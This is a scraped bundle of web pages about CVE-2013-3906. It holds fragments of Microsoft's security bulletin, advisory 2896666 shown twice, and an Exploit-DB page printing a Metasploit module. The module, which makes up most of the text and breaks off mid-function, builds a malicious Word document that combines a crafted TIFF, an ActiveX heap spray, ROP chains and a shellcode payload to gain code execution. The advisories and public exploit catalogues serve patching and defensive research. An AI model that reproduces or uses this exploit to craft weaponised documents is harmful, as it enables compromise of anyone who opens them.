* Security solutions for IT professionals: [TechNet Security Troubleshooting and Support](https://technet.microsoft.com/security/bb980617.aspx)
* Help protect your computer that is running Windows from viruses and malware: [Virus Solution and Security Center](https://support.microsoft.com/contactus/cu_sc_virsec_master)
* Local support according to your country: [International Support](https://support.microsoft.com/common/international.aspx)

#### Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

#### Revisions

* V1.0 (December 10, 2013): Bulletin published.
* V1.1 (December 10, 2013): Clarified that users should undo the **Disable the TIFF Codec** workaround and the **Disable data collaboration in Lync** workaround after applying the update. See the Update FAQ for more information. Added undo steps to the Disable data collaboration in Lync workaround. These are informational changes only.
* V1.2 (December 20, 2013): Revised the **Based on the configuration of my system, how do I know if my system is affected?** Update FAQ to include the updates that are applicable for each configuration. This is an informational change only.

*Built at 2014-04-18T13:49:36Z-07:00*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from technet.microsoft.com_dab6eb97_20250126_083719.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityAdvisories/2013/2896666.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

* Article
* 10/14/2022
* 3 contributors

Feedback

## In this article

Security Advisory

# Microsoft Security Advisory 2896666

## Vulnerability in Microsoft Graphics Component Could Allow Remote Code Execution

Published: November 05, 2013 | Updated: December 10, 2013

**Version:** 2.0

### General Information

#### Executive Summary

Microsoft has completed the investigation into a private report of this vulnerability. We have issued [MS13-096](https://go.microsoft.com/fwlink/?linkid=344108) to address the Microsoft Graphics Component Memory Corruption Vulnerability ([CVE-2013-3906](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-3906)). For more information about this issue, including download links for an available security update, please review [MS13-096](https://go.microsoft.com/fwlink/?linkid=344108).

### Other Information

#### Acknowledgments

Microsoft [thanks](https://go.microsoft.com/fwlink/?linkid=21127) the following for working with us to help protect customers:

* Haifei Li of McAfee Labs IPS Team for reporting the Microsoft Graphics Component Memory Corruption Vulnerability (CVE-2013-3906)

#### Microsoft Active Protections Program (MAPP)

To improve security protections for customers, Microsoft provides vulnerability information to major security software providers in advance of each monthly security update release. Security software providers can then use this vulnerability information to provide updated protections to customers via their security software or devices, such as antivirus, network-based intrusion detection systems, or host-based intrusion prevention systems. To determine whether active protections are available from security software providers, please visit the active protections websites provided by program partners, listed in [Microsoft Active Protections Program (MAPP) Partners](https://go.microsoft.com/fwlink/?linkid=215201).

#### Feedback

* You can provide feedback by completing the Microsoft Help and Support form, [Customer Service Contact Us](https://support.microsoft.com/kb/?scid=sw;en;1257&showpage=1&ws=technet&sd=tech).

#### Support

* Customers in the United States and Canada can receive technical support from [Security Support](https://go.microsoft.com/fwlink/?linkid=21131). For more information, see [Microsoft Help and Support](https://support.microsoft.com/).
* International customers can receive support from their local Microsoft subsidiaries. For more information, see [International Support](https://go.microsoft.com/fwlink/?linkid=21155).
* [Microsoft TechNet Security](https://go.microsoft.com/fwlink/?linkid=21132) provides additional information about security in Microsoft products.

#### Disclaimer

The information provided in this advisory is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

#### Revisions

* V1.0 (November 5, 2013): Advisory published.
* V1.1 (November 12, 2013): Clarified the scope of the active attacks, clarified affected software configurations, and revised workarounds. These are informational changes only. Customers should re-evaluate the applicability of the suggested actions for their environments based on the updated information.
* V2.0 (December 10, 2013): Advisory updated to reflect publication of security bulletin.

*Built at 2014-04-18T13:49:36Z-07:00*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from technet.microsoft.com_973c9b1b_20250125_124241.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityAdvisories/2013/2896666.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

* Article
* 10/14/2022
* 3 contributors

Feedback

## In this article

Security Advisory

# Microsoft Security Advisory 2896666

## Vulnerability in Microsoft Graphics Component Could Allow Remote Code Execution

Published: November 05, 2013 | Updated: December 10, 2013

**Version:** 2.0

### General Information

#### Executive Summary

Microsoft has completed the investigation into a private report of this vulnerability. We have issued [MS13-096](https://go.microsoft.com/fwlink/?linkid=344108) to address the Microsoft Graphics Component Memory Corruption Vulnerability ([CVE-2013-3906](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2013-3906)). For more information about this issue, including download links for an available security update, please review [MS13-096](https://go.microsoft.com/fwlink/?linkid=344108).

### Other Information

#### Acknowledgments

Microsoft [thanks](https://go.microsoft.com/fwlink/?linkid=21127) the following for working with us to help protect customers:

* Haifei Li of McAfee Labs IPS Team for reporting the Microsoft Graphics Component Memory Corruption Vulnerability (CVE-2013-3906)

#### Microsoft Active Protections Program (MAPP)

To improve security protections for customers, Microsoft provides vulnerability information to major security software providers in advance of each monthly security update release. Security software providers can then use this vulnerability information to provide updated protections to customers via their security software or devices, such as antivirus, network-based intrusion detection systems, or host-based intrusion prevention systems. To determine whether active protections are available from security software providers, please visit the active protections websites provided by program partners, listed in [Microsoft Active Protections Program (MAPP) Partners](https://go.microsoft.com/fwlink/?linkid=215201).

#### Feedback

* You can provide feedback by completing the Microsoft Help and Support form, [Customer Service Contact Us](https://support.microsoft.com/kb/?scid=sw;en;1257&showpage=1&ws=technet&sd=tech).

#### Support

* Customers in the United States and Canada can receive technical support from [Security Support](https://go.microsoft.com/fwlink/?linkid=21131). For more information, see [Microsoft Help and Support](https://support.microsoft.com/).
* International customers can receive support from their local Microsoft subsidiaries. For more information, see [International Support](https://go.microsoft.com/fwlink/?linkid=21155).
* [Microsoft TechNet Security](https://go.microsoft.com/fwlink/?linkid=21132) provides additional information about security in Microsoft products.

#### Disclaimer

The information provided in this advisory is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

#### Revisions

* V1.0 (November 5, 2013): Advisory published.
* V1.1 (November 12, 2013): Clarified the scope of the active attacks, clarified affected software configurations, and revised workarounds. These are informational changes only. Customers should re-evaluate the applicability of the suggested actions for their environments based on the updated information.
* V2.0 (December 10, 2013): Advisory updated to reflect publication of security bulletin.

*Built at 2014-04-18T13:49:36Z-07:00*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from www.exploit-db.com_97167a46_20250125_124243.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Microsoft - Tagged Image File Format '.TIFF' Integer Overflow (Metasploit)

#### EDB-ID:

###### 30011

#### CVE:

###### [2013-3906](https://nvd.nist.gov/vuln/detail/CVE-2013-3906)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2013-12-03

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/zip'
require 'nokogiri'

module ::Nokogiri
module XML
  class Builder
    #
    # Some XML documents don't declare the namespace before referencing, but Nokogiri requires one.
    # So here's our hack to get around that by adding a new custom method to the Builder class
    #
    def custom_root(ns)
      e = @parent.create_element(ns)
      e.add_namespace_definition(ns, "href")
      @ns = e.namespace_definitions.find { |x| x.prefix == ns.to_s }
      return self
    end
  end
end
end

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::RopDb

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Microsoft Tagged Image File Format (TIFF) Integer Overflow",
      'Description'    => %q{
          This module exploits a vulnerability found in Microsoft's Tagged Image File Format.
          It was originally discovered in the wild, targeting Windows XP and Windows Server 2003
          users running Microsoft Office, specifically in the Middle East and South Asia region.

          The flaw is due to a DWORD value extracted from the TIFF file that is embedded as a
          drawing in Microsoft Office, and how it gets calculated with user-controlled inputs,
          and stored in the EAX register. The 32-bit register will run out of storage space to
          represent the large vlaue, which ends up being 0, but it still gets pushed as a
          dwBytes argumenet (size) for a HeapAlloc call. The HeapAlloc function will allocate a
          chunk anyway with size 0, and the address of this chunk is used as the destination buffer
          of a memcpy function, where the source buffer is the EXIF data (an extended image format
          supported by TIFF), and is also user-controlled. A function pointer in the chunk returned
          by HeapAlloc will end up being overwritten by the memcpy function, and then later used
          in OGL!GdipCreatePath. By successfully controlling this function pointer, and the
          memory layout using ActiveX, it is possible to gain arbitrary code execution under the
          context of the user.
        },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # Some dude wrote it and deployed in the wild, but Haifei Li spotted it
          'sinn3r'   # Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2013-3906' ],
          [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2896666' ],
          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2013/11/05/cve-2013-3906-a-graphics-vulnerability-exploited-through-word-documents.aspx' ]
        ],
      'Payload'        =>
        {
          'PrependEncoder' => "\x64\xa1\x18\x00\x00\x00" + # mov eax, fs:[0x18]
                              "\x83\xC0\x08"             + # add eax, byte 8
                              "\x8b\x20"                 + # mov esp, [eax]
                              "\x81\xC4\x30\xF8\xFF\xFF",  # add esp, -2000
          'BadChars'       => "\x00"
        },
      'DefaultOptions'  =>
        {
          'ExitFunction' => "process",
          'PrependMigrate' => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # XP SP3 + Office 2010 Standard (14.0.6023.1000 32-bit)
          ['Windows XP SP3 with Office Starndard 2010', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Nov 5 2013", # Microsoft announcement
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [true, 'The docx file', 'msf.docx']),
        ], self.class)
  end

  #
  # Creates a TIFF that triggers the overflow
  #
  def make_tiff
    # TIFF Header:
    # TIFF ID                               = 'II' (Intel order)
    # TIFF Version                          = 42d
    # Offset of FID                         = 0x000049c8h
    #
    # Image Directory:
    # Number of entries                     = 17d
    # Entry[0]  NewSubFileType              = 0
    # Entry[1]  ImageWidth                  = 256d
    # Entry[2]  ImageHeight                 = 338d
    # Entry[3]  BitsPerSample               = 8 8 8
    # Entry[4]  Compression                 = JPEG (6)
    # Entry[5]  Photometric Interpretation  = RGP
    # Entry[6]  StripOffsets                = 68 entries (349 bytes)
    # Entry[7]  SamplesPerPixel             = 3
    # Entry[8]  RowsPerStrip                = 5
    # Entry[9]  StripByteCounts             = 68 entries (278 bytes)
    # Entry[10] XResolution                 = 96d
    # Entry[11] YResolution                 = 96d
    # Entry[12] Planar Configuration        = Clunky
    # Entry[13] Resolution Unit             = Inch
    # Entry[14] Predictor                   = None
    # Entry[15] JPEGInterchangeFormatLength = 5252h (1484h)
    # Entry[16] JPEGInterchangeFormat       = 13636d

    # Notes:
    # These values are extracted from the file to calculate the HeapAlloc size that result in the overflow:
    # - JPEGInterchangeFormatLength
    # - DWORD at offset 3324h (0xffffb898), no documentation for this
    # - DWORDS after offset 3328h, no documentation for these, either.
    # The DWORD at offset 4874h is what ends up overwriting the function pointer by the memcpy
    # The trigger is really a TIF file, but is named as a JPEG in the docx package

    buf = ''
    path = ::File.join(Msf::Config.data_directory, "exploits", "CVE-2013-3906", "word", "media", "image1.jpeg")
    ::File.open(path, "rb") do |f|
      buf = f.read
    end

    # Gain control of the call [eax+50h] instruction
    # XCHG EAX, ESP; RETN msvcrt
    buf[0x4874, 4] = [0x200F0700-0x50].pack('V')

    buf
  end

  #
  # Generates a payload
  #
  def get_rop_payload
    p = ''
    p << [0x77c15ed5].pack('V') # XCHG EAX, ESP  msvcrt
    p << generate_rop_payload('msvcrt','',{'target'=>'xp'})
    p << payload.encoded
    block  = p
    block << rand_text_alpha(1024 - 80 - p.length)
    block << [ 0x77c34fbf, 0x200f0704 ].pack("V") # pop esp # ret # from msvcrt
    block << rand_text_alpha(1024 - block.length)

    buf = ''
    while (buf.length < 0x80000)
      buf << block
    end

    buf
  end

  #
  # Creates an ActiveX bin that will be used as a spray in Office
  #
  def make_activex_bin
    #
    # How an ActiveX bin is referred:
    # document.xml.rels -> ActiveX[num].xml -> activeX[num].xml.rels -> ActiveX[num].bin
    # Every bin is a Microsoft Compound Document File:
    # http://www.openoffice.org/sc/compdocfileformat.pdf

    # The bin file
    mscd  = ''
    mscd << [0xe011cfd0].pack('V')      # File identifier (first 4 byte)
    mscd << [0xe11ab1a1].pack('V')      # File identifier (second 4 byte)
    mscd << [0x00000000].pack('V') * 4  # Unique Identifier
    mscd << [0x003e].pack('v')          # Revision number
    mscd << [0x0003].pack('v')          # Version number
    mscd << [0xfffe].pack('v')          # Byte order: Little-Endian
    mscd << [0x0009].pack('v')          # Sector size
    mscd << [0x0006].pack('v')          # Size of a short-sector
    mscd << "\x00" * 10                 # Not used
    mscd << [0x00000001].pack('V')      # Total number of sectors
    mscd << [0x00000001].pack('V')      # SecID for the first sector
    mscd << [0x00000000].pack('V')      # Not used
    mscd << [0x00001000].pack('V')      # Minimum size of a standard stream
    mscd << [0x00000002].pack('V')      # Sec ID of first sector
    mscd << [0x00000001].pack('V')      # Total number of sectors for the short-sector table
    mscd << [0xfffffffe].pack('V')      # SecID of first sector of the mastser sector table
    mscd << [0x00000000].pack('V')      # Total number of sectors for master sector talbe
    mscd << [0x00000000].pack('V')      # SecIDs
    mscd << [0xffffffff].pack('V') * 4 * 59 # SecIDs
    mscd[0x200, 4]  = [0xfffffffd].pack('V')
    mscd[0x204, 12] = [0xfffffffe].pack('V') * 3
    mscd << Rex::Text.to_unicode("Root Entry")
    mscd << [0x00000000].pack('V') * 11
    mscd << [0x0016].pack('v')          # Valid range of the previous char array
    mscd << "\x05"                      # Type of entry (Root Storage Entry)
    mscd << "\x00"                      # Node colour of the entry (red)
    mscd << [0xffffffff].pack('V')      # DirID of the left child node
    mscd << [0xffffffff].pack('V')      # DirID of the right child node
    mscd << [0x00000001].pack('V')      # DirID of the root node entry
    mscd << [0x1efb6596].pack('V')
    mscd << [0x11d1857c].pack('V')
    mscd << [0xc0006ab1].pack('V')
    mscd << [0x283628f0].pack('V')
    mscd << [0x00000000].pack('V') * 3
    mscd << [0x287e3070].pack('V')
    mscd << [0x01ce2654].pack('V')
    mscd << [0x00000003].pack('V')
    mscd << [0x00000100].pack('V')
    mscd << [0x00000000].pack('V')
    mscd << Rex::Text.to_unicode("Contents")
    mscd << [0x00000000].pack('V') * 12
    mscd << [0x01020012].pack('V')
    mscd << [0xffffffff].pack('V') * 3
    mscd << [0x00000000].pack('V') * 10
    mscd << [0x000000e4].pack('V')
    mscd << [0x00000000].pack('V') * 18
    mscd << [0xffffffff].pack('V') * 3
    mscd << [0x00000000].pack('V') * 29
    mscd << [0xffffffff].pack('V') * 3
    mscd << [0x00000000].pack('V') * 12
    mscd << [0x00000001].pack('V')
    mscd << [0x00000002].pack('V')
    mscd << [0x00000003].pack('V')
    mscd << [0xfffffffe].pack('V')
    mscd << [0xffffffff].pack('V') * 32 #52
    mscd << [0x77c34fbf].pack('V') # POP ESP # RETN
    mscd << [0x200f0704].pack('V') # Final payload target address to begin the ROP
    mscd << [0xffffffff].pack('V') * 18
    mscd << @rop_payload

    mscd
  end

  #
  # Creates an activeX[num].xml file
  # @param rid [String] The relationship ID (example: rId1)
  # @return [String] XML document
  #
  def make_activex_xml(rid)
    attrs = {
      'ax:classid'     => "{1EFB6596-857C-11D1-B16A-00C0F0283628}",
      'ax:license'     => "9368265E-85FE-11d1-8BE3-0000F8754DA1",
      'ax:persistence' => "persistStorage",
      'r:id'           => "rId#{rid.to_s}",
      'xmlns:ax'       => "http://schemas.microsoft.com/office/2006/activeX",
      'xmlns:r'        => @schema
    }
    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
      xml.custom_root("ax")
      xml.ocx(attrs)
    end

    builder.to_xml(:indent => 0)
  end

  #
  # Creates an activeX[num].xml.rels
  # @param relationships [Array] A collection of hashes with each containing:
  #                              :id, :type, :target
  # @return [String] XML document
  #
  def make_activex_xml_reals(rid, target_bin)
    acx_type = "http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary"
    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
    xml.Relationships('xmlns'=>"http://schemas.openxmlformats.org/package/2006/relationships") do
        xml.Relationship({:Id=>"rId#{rid.to_s}", :Type=>acx_type, :Target=>target_bin})
    end
    end

    builder.to_xml(:indent => 0)
  end

  #
  # Creates a document.xml.reals file
  # @param relationships [Array] A collection of hashes with each containing:
  #                              :id, :type, and :target
  # @return [String] XML document
  #
  def make_doc_xml_reals(relationships)
    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
    xml.Relationships('xmlns'=>"http://schemas.openxmlformats.org/package/2006/relationships") do
      relationships.each do |r|
        xml.Relationship({:Id=>"rId#{r[:id].to_s}", :Type=>r[:type], :Target=>r[:target]})
      end
    end
    end

    builder.to_xml(:indent => 0)
  end

  #
  # Creates a _rels/.rels file
  #
  def init_rels(doc_xml, doc_props)
    rels = []
    rels << doc_xml
    rels << doc_props
    rels = rels.flatten

    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
    xml.Relationships('xmlns'=>"http://schemas.openxmlformats.org/package/2006/relationships") do
      rels.each do |r|
        xml.Relationship({:Id=>"rId#{r[:id].to_s}", :Type=>r[:type], :Target=>r[:fname].gsub(/^\//, '')})
      end
    end
    end

    {
      :fname => "_rels/.rels",
      :data  => builder.to_xml(:indent => 0)
    }
  end

  #
  # Creates a run element for chart
  # @param xml [Element]
  # @param rid [String]
  #
  def create_chart_run_element(xml, rid)
    drawingml_schema = "http://schemas.openxmlformats.org/drawingml/2006"

    xml.r do
      xml.rPr do
        xml.noProof
        xml.lang({'w:val' => "en-US"})
      end

      xml.drawing do
        xml['wp'].inline({'distT'=>"0", 'distB'=>"0", 'distL'=>"0", 'distR'=>"0"}) do
          xml['wp'].extent({'cx'=>'1', 'cy'=>'1'})
          xml['wp'].effectExtent({'l'=>"1", 't'=>"0", 'r'=>"1", 'b'=>"0"})
          xml['wp'].docPr({'id'=>rid.to_s, 'name' => "drawing #{rid.to_s}"})
          xml['wp'].cNvGraphicFramePr

          xml['a'].graphic do
            xml['a'].graphicData({'uri'=>"#{drawingml_schema}/chart"}) do
              xml['c'].chart({'r:id'=>"rId#{rid.to_s}"})
            end
          end
        end
      end
    end
  end

  #
  # Creates a run element for ax
  # @param xml [Element]
  # @param rid [String]
  #
  def create_ax_run_element(xml, rid)
    shape_attrs = {
      'id'    => "_x0000_i10#{rid.to_s}",
      'type'  => "#_x0000_t75",
      'style' => "width:1pt;height:1pt",
      'o:ole' => ""
    }

    control_attrs = {
      'r:id'      => "rId#{rid.to_s}",
      'w:name'    => "TabStrip#{rid.to_s}",
      'w:shapeid' =>"_x0000_i10#{rid.to_s}"
    }

    xml.r do
      xml.object({'w:dxaOrig'=>"1440", 'w:dyaOrig'=>"1440"}) do
        xml['v'].shape(shape_attrs)
        xml['w'].control(control_attrs)
      end
    end
  end

  #
  # Creates a pic run element
  # @param xml [Element]
  # @param rid [String]
  #
  def create_pic_run_element(xml, rid)
    drawinxml_schema = "http://schemas.openxmlformats.org/drawingml/2006"

    xml.r do
      xml.rPr do
        xml.noProof
        xml.lang({'w:val'=>"en-US"})
      end

      xml.drawing do
        xml['wp'].inline({'distT'=>"0", 'distB'=>"0", 'distL'=>"0", 'distR'=>"0"}) do
          xml.extent({'cx'=>'1', 'cy'=>'1'})
          xml['wp'].effectExtent({'l'=>"1", 't'=>"0", 'r'=>"0", 'b'=>"0"})
          xml['wp'].docPr({'id'=>rid.to_s, 'name'=>"image", 'descr'=>"image.jpeg"})
          xml['wp'].cNvGraphicFramePr do
            xml['a'].graphicFrameLocks({'xmlns:a'=>"#{drawinxml_schema}/main", 'noChangeAspect'=>"1"})
          end

          xml['a'].graphic({'xmlns:a'=>"#{drawinxml_schema}/main"}) do
            xml['a'].graphicData({'uri'=>"#{drawinxml_schema}/picture"}) do
              xml['pic'].pic({'xmlns:pic'=>"#{drawinxml_schema}/picture"}) do
                xml['pic'].nvPicPr do
                  xml['pic'].cNvPr({'id'=>rid.to_s, 'name'=>"image.jpeg"})
                  xml['pic'].cNvPicPr
                end

                xml['pic'].blipFill do
                  xml['a'].blip('r:embed'=>"rId#{rid.to_s}", 'cstate'=>"print")
                  xml['a'].stretch do
                    xml['a'].fillRect
                  end
                end

                xml['pic'].spPr do
                  xml['a'].xfrm do
                    xml['a'].off({'x'=>"0", 'y'=>"0"})
                    xml['a'].ext({'cx'=>"1", 'cy'=>"1"})
                  end

                  xml['a'].prstGeom({'prst' => "rect"}) do
                    xml['a'].avLst
                  end
                end
              end
            end
          end
        end
      end
    end
  end

  #
  # Creates a document.xml file
  # @param pre_defs [Array]
  # @param activex [Array]
  # @param tiff_file [Array]
  # @return [String] XML document
  #
  def init_doc_xml(last_rid, pre_defs, activex, tiff_file)
    # Get all the required pre-defs
    chart_rids = []
    pre_defs.select { |e| chart_rids << e[:id] if e[:fname] =~ /\/word\/charts\//}

    # Get all the ActiveX RIDs
    ax_rids = []
    activex.select { |e| ax_rids << e[:id] }

    # Get the TIFF RID
    tiff_rid = tiff_file[:id]

    # Documentation on how this is crafted:
    # http://msdn.microsoft.com/en-us/library/office/gg278308.aspx
    doc_attrs = {
      'xmlns:ve'  => "http://schemas.openxmlformats.org/markup-compatibility/2006",
      'xmlns:o'   => "urn:schemas-microsoft-com:office:office",
      'xmlns:r'   => @schema,
      'xmlns:m'   => "http://schemas.openxmlformats.org/officeDocument/2006/math",
      'xmlns:v'   => "urn:schemas-microsoft-com:vml",
      'xmlns:wp'  => "http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing",
      'xmlns:w10' => "urn:schemas-microsoft-com:office:word",
      'xmlns:w'   => "http://schemas.openxmlformats.org/wordprocessingml/2006/main",
      'xmlns:wne' => "http://schemas.microsoft.com/office/word/2006/wordml",
      'xmlns:a'   => "http://schemas.openxmlformats.org/drawingml/2006/main",
      'xmlns:c'   => "http://schemas.openxmlformats.org/drawingml/2006/chart"
    }

    p_attrs_1 = {'w:rsidR' => "00F8254F", 'w:rsidRDefault' => "00D15BD0" }
    p_attrs_2 = {'w:rsidR' => "00D15BD0", 'w:rsidRPr' =>"00D15BD0", 'w:rsidRDefault' => "00D15BD0" }

    md = ::Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
    builder = ::Nokogiri::XML::Builder.with(md) do |xml|
      xml.custom_root("w")

      xml.document(doc_attrs) do
        xml.body do
          # Paragraph (ActiveX)
          xml.p(p_attrs_1) do
            # Paragraph properties
            xml.pPr do
              # Run properties
              xml.rPr do
                xml.lang({'w:val' => "en-US"})
              end
            end

            ax_rids.each do |rid|
              create_ax_run_element(xml, rid)
            end
          end

          xml.p(p_attrs_2) do
            xml.pPr do
              xml.rPr do
                xml['w'].lang({'w:val'=>"en-US"})
              end
            end

            # Charts
            chart_rids.each do |rid|
              create_chart_run_element(xml, rid)
            end

            # TIFF
            create_pic_run_element(xml, tiff_rid)
          end
        end
      end
    end

    {
      :id           => (last_rid + 1).to_s,
      :type         => "#{@schema}/officeDocument",
      :fname        => "/word/document.xml",
      :content_type => "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
      :xml          => builder.to_xml(:indent => 0)
    }
  end

  #
  # Creates a [Content.Types].xml file located in the parent directory
  # @param overrides [Array] A collection of hashes with each containing
  #                          the :PartName and :ContentType info
  # @return [String] XML document
  #
  def make_contenttype_xml(overrides)
    contenttypes = [
      {
        :Extension   => "rels",
        :ContentType => "application/vnd.openxmlformats-package.relationships+xml"
      },
      {
        :Extension   => "xml",
        :ContentType => "application/xml"
      },
      {
        :Extension   => "jpeg",
        :ContentType => "image/jpeg"
      },
      {
        :Extension   => "bin",
